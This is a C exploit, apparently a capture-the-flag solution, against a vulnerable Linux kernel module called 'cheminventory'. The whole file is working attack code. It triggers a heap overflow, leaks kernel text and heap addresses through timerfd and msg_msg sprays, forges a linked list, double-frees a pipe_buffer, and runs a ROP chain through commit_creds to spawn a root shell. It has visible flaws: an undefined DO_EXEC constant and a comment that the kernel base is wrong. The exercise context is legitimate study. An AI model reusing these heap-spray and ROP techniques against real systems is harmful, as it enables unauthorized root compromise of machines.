#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/timerfd.h>
#include <sys/msg.h>
#include <sys/socket.h>

#define DO_CREATE    0xc030ca00 
#define DO_REPLACE   0xc030ca01
#define DO_READ      0xc030ca02
#define DO_FREE	     0xc030ca03

// GLOBAL VARIABLES
int fd;
uint64_t kernel_leak;
uint64_t kernel_base;
uint64_t kheap_256_addr;
uint64_t vuln_msg;
uint64_t fake_msg;
uint64_t kheap_one_addr;
uint64_t kheap_two_addr; 
uint64_t kheap_three_addr;
uint64_t kheap_1024_addr;
uint64_t security_leak;

// TIMERFD STUFF
#define NUM_TIMERFDS 1024
#define NUM_PADDING 1024
int timerfds[NUM_TIMERFDS];
int padding[NUM_PADDING];
struct itimerspec timerValue;

// MSG_MSG STUFF
#define NUM_MSQIDS 1024
#define MSG_TAG 0X41424344
#define MSG_MSG_SIZE (sizeof(struct msg_msg))
#define MSG_MSGSEG_SIZE (sizeof(struct msg_msgseg))
#define PAGE_SIZE 0x1000
int msqid[NUM_MSQIDS];

struct msg_msg {
    uint64_t m_list_next;
    uint64_t m_list_prev;
    uint64_t m_type;
    uint64_t m_ts;
    uint64_t next;
    uint64_t security;
};

struct msg_msgseg {
    uint64_t next;
};

struct {
  long mtype;
  char mtext[256 - MSG_MSG_SIZE];
} message; // Primary message of size 256

struct {
  long mtype;
  char mtext[1024 - MSG_MSG_SIZE];
} msg_secondary; // For spraying msg_msg seg

struct {
  long mtype;
  char mtext[512 - MSG_MSG_SIZE];
} msg_one; 

struct {
  long mtype;
  char mtext[2048 - MSG_MSG_SIZE];
} msg_two; 

struct {
  long mtype;
  char mtext[4096 - MSG_MSG_SIZE];
} msg_three; 

void build_msg_msg(struct msg_msg *msg, uint64_t m_list_next, uint64_t m_list_prev, uint64_t m_ts, uint64_t next, uint64_t security) {
    msg->m_list_next = m_list_next;
    msg->m_list_prev = m_list_prev;
    msg->m_type = 0x42;
    msg->m_ts = m_ts;
    msg->next = next;
    msg->security = security;
}

// SEQ_OPERATIONS STUFF
#define NUM_SEQOPS 1024
int seqops[NUM_SEQOPS];

// SOCKET/SKBUFF STUFF
#define NUM_SOCKETS 4
#define NUM_SKBUFFS 128
#define SKB_SHARED_INFO_SIZE 0x140
int s;
int ss[NUM_SOCKETS][2];
char secondary_buf[1024 - SKB_SHARED_INFO_SIZE];

// PIPE BUFFER STUFF
#define NUM_PIPEFDS 256
int pipefd[NUM_PIPEFDS][2];

struct pipe_buffer {
  uint64_t page;
  uint32_t offset;
  uint32_t len;
  uint64_t ops;
  uint32_t flags;
  uint32_t pad;
  uint64_t private;
};

struct pipe_buf_operations {
  uint64_t confirm;
  uint64_t release;
  uint64_t steal;
  uint64_t get;
};

// MODULE STUFF
struct req {
    uint64_t quantity; 
    uint64_t cas;
    uint64_t idx;
    uint64_t note_size;
    uint64_t note_addr;
    uint64_t name_addr;
};

int create_chem(uint64_t quantity, uint64_t cas, uint64_t size, char * note, char * name) {
    struct req req; 
    req.quantity = quantity; 
    req.cas = cas;
    req.idx = 0;
    req.note_size = size;
    req.note_addr = (uint64_t) note;
    req.name_addr = (uint64_t) name;
    
    if (ioctl(fd, DO_CREATE, &req) < 0) {
        perror("[!] Create failed");
        return -1;
    }
    printf("[+] Created new chemical\n");
    return 0;
}

int replace_chem(uint64_t quantity, uint64_t cas, uint64_t idx, uint64_t size, char * note, char * name) {
    struct req req; 
    req.quantity = quantity;
    req.cas = cas; 
    req.idx = idx;
    req.note_size = size;
    req.note_addr = (uint64_t) note;
    req.name_addr = (uint64_t) name;
    
    if (ioctl(fd, DO_REPLACE, &req) < 0) {
        perror("[!] Replace failed");
        return -1;
    }
    printf("[+] Replaced chemical at idx %lld\n", idx);
    return 0;
}

int read_chem(uint64_t idx, char * note, char * name) {
    struct req req; 
    req.quantity = 0; 
    req.cas = 0; 
    req.idx = idx; 
    req.note_size = 0;
    req.note_addr = (uint64_t) note; 
    req.name_addr = (uint64_t) name;
    
    if (ioctl(fd, DO_READ, &req) < 0) {
        perror("[!] Read failed");
        return -1;
    }
    printf("[+] Performed read\n");
    return 0;
}

int free_chem(uint64_t idx) {
    struct req req; 
    req.quantity = 0; 
    req.cas = 0; 
    req.idx = idx; 
    req.note_size = 0;
    req.note_addr = 0; 
    req.name_addr = 0;
    
    if (ioctl(fd, DO_FREE, &req) < 0) {
        perror("[!] Free failed");
        return -1;
    }
    printf("[+] Performed free\n");
    return 0;
}

int exec_chem(uint64_t idx) {
    struct req req; 
    req.quantity = 0; 
    req.cas = 0; 
    req.idx = idx; 
    req.note_size = 0;
    req.note_addr = 0; 
    req.name_addr = 0;
    
    if (ioctl(fd, DO_EXEC, &req) < 0) {
        perror("[!] Exec failed");
        return -1;
    }
    printf("[+] Performed execute\n");
    return 0;
}

// PWNY STUFF
unsigned long user_cs, user_ss, user_rflags, user_sp;
void save_state() {
    __asm__(
        ".intel_syntax noprefix;"
        "mov user_cs, cs;"
        "mov user_ss, ss;"
        "mov user_sp, rsp;"
        "pushf;"
        "pop user_rflags;"
        ".att_syntax;"
    );
    puts("[+] Saved state");
}

// GET SHELL
void get_shell(void) {
    puts("[+] Returned to userland");
    if (getuid() == 0){
        printf("[+] UID: %d, got root!\n", getuid());
        system("/bin/sh");
    } else {
        printf("[!] UID: %d, didn't get root\n", getuid());
        exit(-1);
    }
}
unsigned long user_rip = (unsigned long)get_shell;

int main(void) {
    uint64_t buf[0x100];
    uint64_t buf2[0x100];
    
    // STAGE 1: SETUP
    printf("STAGE 1: SETUP\n");
    printf("[+] Initial setup\n");
    cpu_set_t cpu;
    CPU_ZERO(&cpu);
    CPU_SET(0, &cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &cpu)) {
        perror("sched_setaffinity");
        exit(-1);
    }
    
    // Set up message queues
    printf("[+] Setting up msg queues\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        if ((msqid[i] = msgget(IPC_PRIVATE, IPC_CREAT | 0666)) < 0) {
            perror("[!] msgget failed");
            exit(-1);
        }
    }
    
    // Set up sockets
    printf("[+] Setting up sockets\n");
    for (int i = 0; i < NUM_SOCKETS; i++) {
        if (socketpair(AF_UNIX, SOCK_STREAM, 0, ss[i]) < 0) {
            perror("[!] Socket pair");
            exit(-1);
        }
    }
    
    // Set up pipe_buffer stuff
    struct pipe_buf_operations *ops;
    struct pipe_buffer *pbuf;
    
    // Open Cheminventory word device
    printf("[+] Opening Cheminventory device\n");
    if ((fd = open("/dev/cheminventory", O_RDONLY)) < 0) {
        perror("[!] Failed to open miscdevice");
        exit(-1);
    }
    
    // Padding timerfd spray
    printf("[+] Spraying padding timerfd\n");
    for (int i = 0; i < NUM_PADDING; i++) {
        padding[i] = timerfd_create(CLOCK_REALTIME, 0); 
        timerValue.it_value.tv_sec = 1;
        timerValue.it_value.tv_nsec = 0;
        timerValue.it_interval.tv_sec = 1;
        timerValue.it_interval.tv_nsec = 0;
        timerfd_settime(padding[i],  0, &timerValue, NULL); 
    }   
    sleep(1); 
    
    // Create vulnerable object
    create_chem(0x41414141, 0x42424242, 0x50, "Carcinogenic", "Benzene"); 
    
    // STAGE 2: KERNEL TEXT LEAK
    printf("STAGE 2: KERNEL TEXT LEAK\n");
    
    // Trigger vulnerability
    replace_chem(44444444, 55555555, 0, 0xffffffffffffffff, "blabla", "meowmeow");
    
    // Spray timerfd objects
    printf("[+] Spraying timerfds\n");
    for (int i = 0; i < NUM_TIMERFDS; i++) {
        timerfds[i] = timerfd_create(CLOCK_REALTIME, 0); 
        timerValue.it_value.tv_sec = 1;
        timerValue.it_value.tv_nsec = 0;
        timerValue.it_interval.tv_sec = 1;
        timerValue.it_interval.tv_nsec = 0;
        timerfd_settime(timerfds[i],  0, &timerValue, NULL); 
    }   
    sleep(1); 
    
    read_chem(0, buf, buf2); 
    
    // Get kernel text leak 
    kernel_leak = buf2[5];
    printf("[+] Kernel text leak: 0x%llx\n", kernel_leak);
    kernel_base = kernel_leak - 0x285ba0 - 0x120;
    printf("[+] Kernel base: 0x%llx\n", kernel_base); // BTW KERNEL BASE IS WRONG
    
    // STAGE 3: KERNEL HEAP LEAK 
    printf("STAGE 3: KERNEL HEAP LEAK\n");
    
    // Free padding spray timerfd objects
    printf("[+] Freeing padding timerfd spray\n");
    for (int i = 0; i < NUM_PADDING; i++) {
        close(padding[i]);
    }
    sleep(1);

    // Free timerfd objects
    printf("[+] Freeing timerfd spray\n");
    for (int i = 0; i < NUM_TIMERFDS; i++) {
        close(timerfds[i]);
    }
    sleep(1);
    
    // Cross cache msg_msg spray
    printf("[+] Cross cache msg_msg spray\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&message, 0, sizeof(message));
        *(long *)&message.mtype = 0x41;
        *(int *)&message.mtext[0] = MSG_TAG;
        *(int *)&message.mtext[4] = i;
        if (msgsnd(msqid[i], &message, sizeof(message) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    sleep(1);
    
    // Fake object 1
    printf("[+] Fake object 1 msg_msg spray\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&msg_one, 0, sizeof(msg_one));
        *(long *)&msg_one.mtype = 0x61;
        *(int *)&msg_one.mtext[0] = MSG_TAG;
        *(int *)&msg_one.mtext[4] = i;
        if (msgsnd(msqid[i], &msg_one, sizeof(msg_one) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    sleep(1);
    
    // Spraying secondary msg_msg 
    printf("[+] Secondary msg_msg spray\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&msg_secondary, 0, sizeof(msg_secondary));
        *(long *)&msg_secondary.mtype = 0x42;
        *(int *)&msg_secondary.mtext[0] = MSG_TAG;
        *(int *)&msg_secondary.mtext[4] = i;
        if (msgsnd(msqid[i], &msg_secondary, sizeof(msg_secondary) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    sleep(1);
    
    // Fake object 2
    printf("[+] Fake object 2 msg_msg spray\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&msg_two, 0, sizeof(msg_two));
        *(long *)&msg_two.mtype = 0x62;
        *(int *)&msg_two.mtext[0] = MSG_TAG;
        *(int *)&msg_two.mtext[4] = i;
        if (msgsnd(msqid[i], &msg_two, sizeof(msg_two) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    sleep(1);
    
    // Fake object 3
    printf("[+] Fake object 3 msg_msg spray\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&msg_three, 0, sizeof(msg_three));
        *(long *)&msg_three.mtype = 0x63;
        *(int *)&msg_three.mtext[0] = MSG_TAG;
        *(int *)&msg_three.mtext[4] = i;
        if (msgsnd(msqid[i], &msg_three, sizeof(msg_three) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    sleep(1);
    
    memset(buf2, 0, sizeof(buf2));
    read_chem(0, buf, buf2); 
    
    kheap_one_addr = buf2[0];
    printf("[+] Fake object 1 address: 0x%llx\n", kheap_one_addr); 
    vuln_msg = buf2[6] >> 32; 
    printf("[+] msg_msg at vulnerable object: 0x%x\n", (int) vuln_msg); 
    fake_msg = vuln_msg;
    
    // Free primary msg_msg at vulnerable object
    printf("[+] Freeing that one specific primary msg_msg\n");
    if (msgrcv(msqid[vuln_msg], &message, sizeof(message)-sizeof(long), 0x41, 0) < 0) {
        perror("[!] Free msg_msg object failed");
        exit(-1);
    }
    sleep(1);
    
    // Spray new primary msg_msg to cover vulnerable object
    printf("[+] Spraying new primary msg_msg\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&message, 0, sizeof(message));
        *(long *)&message.mtype = 0x43;
        *(int *)&message.mtext[0] = MSG_TAG;
        *(int *)&message.mtext[4] = i;
        *(uint64_t *)&message.mtext[192] = 0x40;
        *(uint64_t *)&message.mtext[200] = kheap_one_addr; 
        if (msgsnd(msqid[i], &message, sizeof(message) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    sleep(1);
    
    memset(buf2, 0, sizeof(buf2));
    read_chem(0, buf, buf2); 

    kheap_1024_addr = buf[0];
    printf("[+] kmalloc-cg-1024 address: 0x%llx\n", kheap_1024_addr); 
    security_leak = buf[5];
    printf("[+] SELinux security pointer leak: 0x%llx\n", security_leak);
    vuln_msg = buf2[6] >> 32; 
    printf("[+] msg_msg at vulnerable object: 0x%x\n", (int) vuln_msg); 
    
    // Free primary msg_msg at vulnerable object
    printf("[+] Freeing that one specific primary msg_msg\n");
    if (msgrcv(msqid[vuln_msg], &message, sizeof(message)-sizeof(long), 0x43, 0) < 0) {
        perror("[!] Free msg_msg object failed");
        exit(-1);
    }
    sleep(1);
    
    // Spray new primary msg_msg to cover vulnerable object
    printf("[+] Spraying new primary msg_msg\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&message, 0, sizeof(message));
        *(long *)&message.mtype = 0x44;
        *(int *)&message.mtext[0] = MSG_TAG;
        *(int *)&message.mtext[4] = i;
        *(uint64_t *)&message.mtext[192] = 0x40;
        *(uint64_t *)&message.mtext[200] = kheap_1024_addr; 
        if (msgsnd(msqid[i], &message, sizeof(message) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    sleep(1);
    
    memset(buf2, 0, sizeof(buf2));
    read_chem(0, buf, buf2); 

    kheap_two_addr = buf[0];
    printf("[+] Fake object 2 address: 0x%llx\n", kheap_two_addr); 
    vuln_msg = buf2[6] >> 32; 
    printf("[+] msg_msg at vulnerable object: 0x%x\n", (int) vuln_msg); 
    
    // Free primary msg_msg at vulnerable object
    printf("[+] Freeing that one specific primary msg_msg\n");
    if (msgrcv(msqid[vuln_msg], &message, sizeof(message)-sizeof(long), 0x44, 0) < 0) {
        perror("[!] Free msg_msg object failed");
        exit(-1);
    }
    sleep(1);
    
    // Spray new primary msg_msg to cover vulnerable object
    printf("[+] Spraying new primary msg_msg\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&message, 0, sizeof(message));
        *(long *)&message.mtype = 0x45;
        *(int *)&message.mtext[0] = MSG_TAG;
        *(int *)&message.mtext[4] = i;
        *(uint64_t *)&message.mtext[192] = 0x40;
        *(uint64_t *)&message.mtext[200] = kheap_two_addr; 
        if (msgsnd(msqid[i], &message, sizeof(message) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    sleep(1);
    
    memset(buf2, 0, sizeof(buf2));
    read_chem(0, buf, buf2); 

    kheap_three_addr = buf[0];
    printf("[+] Fake object 3 address: 0x%llx\n", kheap_three_addr); 
    vuln_msg = buf2[6] >> 32; 
    printf("[+] msg_msg at vulnerable object: 0x%x\n", (int) vuln_msg); 
    
    // STAGE 4: FORGED LINKED LIST
    printf("STAGE 4: MAKE FAKE LINKED LIST\n");
    
    // Free primary msg_msg at vulnerable object
    printf("[+] Freeing that one specific primary msg_msg\n");
    if (msgrcv(msqid[vuln_msg], &message, sizeof(message)-sizeof(long), 0x45, 0) < 0) {
        perror("[!] Free msg_msg object failed");
        exit(-1);
    }
    sleep(1);
    
    // Spray new primary msg_msg to cover vulnerable object
    printf("[+] Spraying new primary msg_msg\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&message, 0, sizeof(message));
        *(long *)&message.mtype = 0x46;
        *(int *)&message.mtext[0] = MSG_TAG;
        *(int *)&message.mtext[4] = i;
        *(uint64_t *)&message.mtext[176] = kheap_one_addr + 224; // next
        *(uint64_t *)&message.mtext[184] = kheap_one_addr; // prev
        *(uint64_t *)&message.mtext[192] = 0x40; // note_size
        *(uint64_t *)&message.mtext[200] = kheap_1024_addr; // note_addr
        if (msgsnd(msqid[i], &message, sizeof(message) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    sleep(1);
    
    // Free fake object 1 at specific position
    printf("[+] Freeing fake object 1\n");
    if (msgrcv(msqid[fake_msg], &msg_one, sizeof(msg_one)-sizeof(long), 0x61, 0) < 0) {
        perror("[!] Free msg_msg object failed");
        exit(-1);
    }
    sleep(1);
    
    // Spray new fake object 1
    printf("[+] Spraying new fake object 1\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&msg_one, 0, sizeof(msg_one));
        *(long *)&msg_one.mtype = 0x71;
        *(int *)&msg_one.mtext[0] = MSG_TAG;
        *(int *)&msg_one.mtext[4] = i;
        *(uint64_t *)&msg_one.mtext[168] = 1; // idx
        *(uint64_t *)&msg_one.mtext[176] = kheap_two_addr +224; // next
        *(uint64_t *)&msg_one.mtext[184] = kheap_three_addr + 224; // prev
        *(uint64_t *)&msg_one.mtext[192] = 0x40;
        *(uint64_t *)&msg_one.mtext[200] = kheap_1024_addr; 
        if (msgsnd(msqid[i], &msg_one, sizeof(msg_one) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    sleep(1);
    
    // Free fake object 2 at specific position
    printf("[+] Freeing fake object 2\n");
    if (msgrcv(msqid[fake_msg], &msg_two, sizeof(msg_two)-sizeof(long), 0x62, 0) < 0) {
        perror("[!] Free msg_msg object failed");
        exit(-1);
    }
    sleep(1);
    
    // Spray new fake object 2
    printf("[+] Spraying new fake object 2\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&msg_two, 0, sizeof(msg_two));
        *(long *)&msg_two.mtype = 0x72;
        *(int *)&msg_two.mtext[0] = MSG_TAG;
        *(int *)&msg_two.mtext[4] = i;
        *(uint64_t *)&msg_two.mtext[168] = 2; // idx
        *(uint64_t *)&msg_two.mtext[176] = kheap_three_addr + 224; // next
        *(uint64_t *)&msg_two.mtext[184] = kheap_one_addr + 224; // prev
        *(uint64_t *)&msg_two.mtext[192] = 0x40;
        *(uint64_t *)&msg_two.mtext[200] = kheap_1024_addr; 
        if (msgsnd(msqid[i], &msg_two, sizeof(msg_two) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    sleep(1);
    
    // Free fake object 3 at specific position
    printf("[+] Freeing fake object 3\n");
    if (msgrcv(msqid[fake_msg], &msg_three, sizeof(msg_three)-sizeof(long), 0x63, 0) < 0) {
        perror("[!] Free msg_msg object failed");
        exit(-1);
    }
    sleep(1);
    
    // Spray new fake object 3
    printf("[+] Spraying new fake object 3\n");
    for (int i = 0; i < NUM_MSQIDS; i++) {
        memset(&msg_three, 0, sizeof(msg_three));
        *(long *)&msg_three.mtype = 0x73;
        *(int *)&msg_three.mtext[0] = MSG_TAG;
        *(int *)&msg_three.mtext[4] = i;
        *(uint64_t *)&msg_three.mtext[168] = 2; // idx
        *(uint64_t *)&msg_three.mtext[176] = kheap_one_addr + 224; // next
        *(uint64_t *)&msg_three.mtext[184] = kheap_two_addr + 224; // prev
        *(uint64_t *)&msg_three.mtext[192] = 0x40;
        *(uint64_t *)&msg_three.mtext[200] = kheap_1024_addr; 
        if (msgsnd(msqid[i], &msg_three, sizeof(msg_three) - sizeof(long), 0) < 0) {
            perror("[!] msg_msg spray failed");
            exit(-1);
        }
    }
    sleep(1);
    
    // Free the kmalloc-cg-1024
    printf("[+] Freeing secondary msg_msg\n");
    if (msgrcv(msqid[fake_msg], &msg_secondary, sizeof(msg_secondary)-sizeof(long), 0x42, 0) < 0) {
        perror("[!] Free msg_msg object failed");
        exit(-1);
    }
    sleep(1);
    
    // Spraying pipe_buf objects
    printf("[+] Spraying pipe_buf over freed 1024 area\n");
    for (int i = 0; i < NUM_PIPEFDS; i++) {
        if (pipe(pipefd[i]) < 0) {
            perror("[!] pipe");
            exit(-1);
        }
        if (write(pipefd[i][1], "ABC", 3) < 0) {
            perror("[!] write");
            exit(-1);
        }
    } 
    
    // Perform double free on kmalloc-cg-1024
    free_chem(2);
    
    // STAGE 5: ROP TIME
    printf("STAGE 5: ROP TIME!!!\n");
    
    save_state();
    
    // ROP stuff
    memset(secondary_buf, 0, sizeof(secondary_buf));
    pbuf = (struct pipe_buffer *)&secondary_buf;
    pbuf->ops = kheap_1024_addr + 0x290;
    ops = (struct pipe_buf_operations *)&secondary_buf[0x290];
    ops->release = kernel_base + 0x556dc6; // 0xffffffff81556dc6 : push rsi ; jmp qword ptr [rsi + 0x39]
    
    uint64_t *rop;
    rop = (uint64_t *)&secondary_buf[0x39];
    *rop = kernel_base + 0x135dff; // 0xffffffff81135dff : pop rsp ; ret
    
    rop = (uint64_t *)&secondary_buf[0x0];
    *rop = 0xdeadbeefcafebabe;
    *rop++ = kernel_base + 0x4433ec; // 0xffffffff814433ec : ret 0x100;
    *rop++ = kernel_base + 0x135e00; // ret
    
    rop = (uint64_t *)&secondary_buf[0x178];
    *rop = kernel_base + 0x05a15f; // pop rdi ; pop 5 ; ret
    *rop++ = kernel_base + 0x05a15f; // pop rdi ; pop 5 ; ret
    
    rop = (uint64_t *)&secondary_buf[0x110];
    *rop = 0x4141414141414141;
    *rop++ = kernel_base + 0x05a15f; // pop rdi ; pop 5 ; ret
    *rop++ = kernel_base + 0x1209e80; // init_task
    *rop++ = 0x4141414141414141;
    *rop++ = 0x4141414141414141;
    *rop++ = 0x4141414141414141;
    *rop++ = 0x4141414141414141;
    *rop++ = 0x4141414141414141;
    *rop++ = kernel_base + 0x0a8a30; // prepare_kernel_cred 
    *rop++ = kernel_base + 0x00a903; // pop rcx ; ret
    *rop++ = kheap_1024_addr + 0x178; 
    *rop++ = kernel_base + 0x345de3; // push rax ; jmp qword ptr [rcx]
    *rop++ = 0x4141414141414141;
    *rop++ = 0x4141414141414141;
    *rop++;
    *rop++ = 0x4141414141414141;
    *rop++ = 0x4141414141414141;
    *rop++ = kernel_base + 0x0a8500; // commit_creds
    *rop++ = kernel_base + 0xa39238; // swapgs
    *rop++ = kernel_base + 0x03095f; // iretq
    *rop++ = user_rip;
    *rop++ = user_cs; 
    *rop++ = user_rflags;
    *rop++ = user_sp;
    *rop++ = user_ss; 
    
    // kernel_base noaslr : 0xffffffff81000000
    // 0xffffffff81556dc6 : push rsi ; jmp qword ptr [rsi + 0x39]
    // 0xffffffff81135dff : pop rsp ; ret
    // 0xffffffff814433ec : ret 0x100
    // 0xffffffff81135e00 : ret
    // 0xffffffff8105a15f : pop rdi ; pop r14 ; pop r13 ; pop r12 ; pop rbp ; pop rbx ; ret
    // 0xffffffff8100a903 : pop rcx ; ret
    // 0xffffffff81345de3 : push rax ; jmp qword ptr [rcx]
    // 0xffffffff81a39238 : swapgs ; ret
    // 0xffffffff8103095f : iretq ; ret

    // init_task : 0xffffffff82209e80
    // prepare_kernel_cred : 0xffffffff810a8a30
    // commit_creds : 0xffffffff810a8500

    signal(SIGSEGV, get_shell);
    
    // Spray pipe_buf objects
    printf("[+] Spraying fake pipe_buffer objects\n");
    for (int i = 0; i < NUM_SOCKETS; i++) {
        for (int j = 0; j < NUM_SKBUFFS; j++) {
            if (write(ss[i][0], secondary_buf, sizeof(secondary_buf)) < 0) {
                perror("[!] write");
                exit(-1);
            }
        }
    }
    sleep(1);

    // Release pipe_buffer objects
    printf("[+] Releasing pipe_buffer objects\n");
    for (int i = 0; i < NUM_PIPEFDS; i++) {
        if (close(pipefd[i][0]) < 0) {
            perror("[!] close");
            exit(-1);
        }
        if (close(pipefd[i][1]) < 0) {
            perror("[!] close");
            exit(-1);
        }
    } 

    sleep(1000);
    
    return 0;
    
}
